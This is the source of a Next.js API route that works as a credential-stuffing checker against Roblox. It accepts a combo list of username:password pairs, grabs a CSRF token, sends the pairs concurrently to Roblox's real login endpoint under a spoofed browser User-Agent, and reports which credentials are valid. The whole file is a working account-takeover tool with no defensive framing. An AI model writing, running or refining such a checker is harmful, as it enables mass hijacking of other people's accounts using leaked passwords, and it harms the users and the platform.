import { NextRequest, NextResponse } from 'next/server';

export const runtime = 'nodejs';
export const maxDuration = 300;

type Result = { status: 'valid' | 'invalid' | 'error' | 'rate'; username: string };

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';

async function checkOne(user: string, pass: string): Promise<Result> {
  try {
    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'User-Agent': UA },
      signal: AbortSignal.timeout(10000)
    });
    const csrf = csrfRes.headers.get('x-csrf-token') || '';

    const res = await fetch('https://auth.roblox.com/v2/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-csrf-token': csrf,
        'User-Agent': UA
      },
      body: JSON.stringify({ username: user, password: pass }),
      signal: AbortSignal.timeout(10000)
    });

    if (res.status === 200) return { status: 'valid', username: user };
    if (res.status === 429) return { status: 'rate', username: user };
    return { status: 'invalid', username: user };
  } catch {
    return { status: 'error', username: user };
  }
}

async function runWithThreads(lines: string[], threads: number, delayMs: number, onResult: (r: Result) => void) {
  const queue = [...lines];
  const workers = Array.from({ length: threads }, async () => {
    while (queue.length) {
      const line = queue.shift();
      if (!line) break;
      const [user, pass] = line.split(':');
      if (!user || !pass) { onResult({ status: 'error', username: user || 'unknown' }); continue; }
      onResult(await checkOne(user.trim(), pass.trim()));
      if (delayMs > 0) await new Promise(r => setTimeout(r, delayMs));
    }
  });
  await Promise.all(workers);
}

export async function POST(req: NextRequest) {
  const { combo, threads = 1, delay = 3000 } = await req.json();
  if (!combo || typeof combo !== 'string') return NextResponse.json({ error: 'no combo' }, { status: 400 });

  const lines = combo.split('\n').map(l => l.trim()).filter(Boolean).slice(0, 500);
  const results: Result[] = [];
  await runWithThreads(lines, Math.min(threads, 20), delay, (r) => results.push(r));

  return NextResponse.json({
    total: lines.length,
    valid: results.filter(r => r.status === 'valid').length,
    invalid: results.filter(r => r.status === 'invalid').length,
    error: results.filter(r => r.status === 'error').length,
    rate: results.filter(r => r.status === 'rate').length,
    results
  });
}
